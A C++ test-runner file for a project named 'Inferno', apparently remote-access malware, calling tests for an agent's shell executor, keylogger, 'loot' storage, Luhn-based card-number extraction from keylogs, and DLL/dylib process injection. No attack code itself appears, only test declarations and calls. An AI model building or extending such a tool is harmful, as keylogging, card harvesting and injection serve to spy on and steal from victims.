#include <iostream>
#include "../common/include/CryptoContext.hpp"

// External socket tests
extern void test_socket_creation();
extern void test_end_to_end_connection();

// External server tests
extern void test_server_constructors();
extern void test_server_start();
extern void test_server_disconnect_agent();

// External packet tests
extern void test_packet_serialization();
extern void test_packet_deserialization();
extern void test_packet_endianness();
extern void test_packet_size_limit();
extern void test_fragmented_deserialization();

// External shell executor tests
extern void test_shell_executor_echo();
extern void test_shell_executor_failure();
extern void test_shell_executor_stderr_redirect();
extern void test_shell_executor_chunk_size();

// Empty payload crypto test
extern void test_empty_payload_encrypt_decrypt();

// Injection opcode unit tests
extern void test_inject_packet_roundtrip();
extern void test_inject_res_packet_roundtrip();

// Injection E2E test
extern void test_inject_e2e();

// Phase 4A — macOS Dylib Injection Tests
#ifdef __APPLE__
extern void test_agent_dylib_loads();
extern void test_shim_binary_exists();
#endif

// Phase 4B — Windows DLL Injection Tests
#ifdef _WIN32
extern void test_agent_dll_loads();
extern void test_loader_binary_exists();
extern void test_find_ntdll_string();
extern void test_find_ntdll_string_not_found();
extern void test_find_ntdll_string_longer();
extern void test_windows_injector_stub();
#endif

// Tier 2 Scanner Tests
extern void test_scanner_classification();
extern void test_scanner_empty_report();

// External keylogger tests
extern void test_keylogger_init_state();
extern void test_keylogger_start_stop();
extern void test_keylogger_dump_clears_buffer();
extern void test_keylogger_capacity_limit();
extern void test_db_singleton();
extern void test_db_agent_registration();
extern void test_db_telemetry_history();
extern void test_db_keylog_history();
extern void test_db_loot_persistence();
extern void test_db_multithreaded_read();

// Circle 6 Analysis Tests
extern void test_analysis_luhn_validation();
extern void test_analysis_data_extraction();
extern void test_analysis_db_persistence();
extern void test_analysis_backspace_filtering();
extern void test_analysis_chronological_keylogs();

// Circle 7 Process Profiler Tests
extern void test_process_profiler_snapshot();

// Circle 8 (Phase 0) Linux evdev keylogger test
#ifdef __linux__
extern void test_keylogger_linux_backend_compiles();
#endif

#include <QCoreApplication>
#include <iostream>

void qtMessageOutput(QtMsgType type, const QMessageLogContext &, const QString &msg) {
    QByteArray localMsg = msg.toLocal8Bit();
    switch (type) {
    case QtDebugMsg:
        std::cerr << localMsg.constData() << std::endl;
        break;
    case QtInfoMsg:
        std::cerr << "[INFO] " << localMsg.constData() << std::endl;
        break;
    case QtWarningMsg:
        std::cerr << "[WARNING] " << localMsg.constData() << std::endl;
        break;
    case QtCriticalMsg:
        std::cerr << "[CRITICAL] " << localMsg.constData() << std::endl;
        break;
    case QtFatalMsg:
        std::cerr << "[FATAL] " << localMsg.constData() << std::endl;
        abort();
    }
}

int main(int argc, char* argv[]) {
    qInstallMessageHandler(qtMessageOutput);
    // QSqlDatabase and other Qt components require a QCoreApplication instance
    QCoreApplication app(argc, argv);

    inferno::CryptoContext::instance().initDefault();
    std::cout << "\n=== Inferno TDD Suite ===" << std::endl;
    
    test_socket_creation();
    test_end_to_end_connection();
    test_server_constructors();
    test_server_start();
    test_server_disconnect_agent();
    test_packet_serialization();
    test_packet_deserialization();
    test_packet_endianness();
    test_packet_size_limit();
    test_fragmented_deserialization();
    test_empty_payload_encrypt_decrypt();
    test_shell_executor_echo();
    test_shell_executor_failure();
    test_shell_executor_stderr_redirect();
    test_shell_executor_chunk_size();
    
    test_keylogger_init_state();
    test_keylogger_start_stop();
    test_keylogger_dump_clears_buffer();
    test_keylogger_capacity_limit();
    
    // Circle 5 Persistence Tests
    test_db_singleton();
    test_db_agent_registration();
    test_db_telemetry_history();
    test_db_keylog_history();
    test_db_loot_persistence();
    test_db_multithreaded_read();
    
    // Circle 6 Analysis Tests
    test_analysis_luhn_validation();
    test_analysis_data_extraction();
    test_analysis_db_persistence();
    test_analysis_backspace_filtering();
    test_analysis_chronological_keylogs();

    // Circle 7 Process Profiler Tests
    test_process_profiler_snapshot();

#ifdef __linux__
    test_keylogger_linux_backend_compiles();
#endif

    // Phase 4A — macOS Dylib Injection Tests
#ifdef __APPLE__
    test_agent_dylib_loads();
    test_shim_binary_exists();
#endif

    // Phase 4B — Windows DLL Injection Tests
#ifdef _WIN32
    test_agent_dll_loads();
    test_loader_binary_exists();
    test_find_ntdll_string();
    test_find_ntdll_string_not_found();
    test_find_ntdll_string_longer();
    test_windows_injector_stub();
#endif

    // Tier 2 Scanner Tests
    test_scanner_classification();
    test_scanner_empty_report();

    // Injection opcode round-trip tests
    test_inject_packet_roundtrip();
    test_inject_res_packet_roundtrip();

    // Injection E2E round-trip test (no actual fork, uses INFERNO_TESTING stub)
    test_inject_e2e();
    
    std::cout << "=========================\n" << std::endl;
    return 0;
}
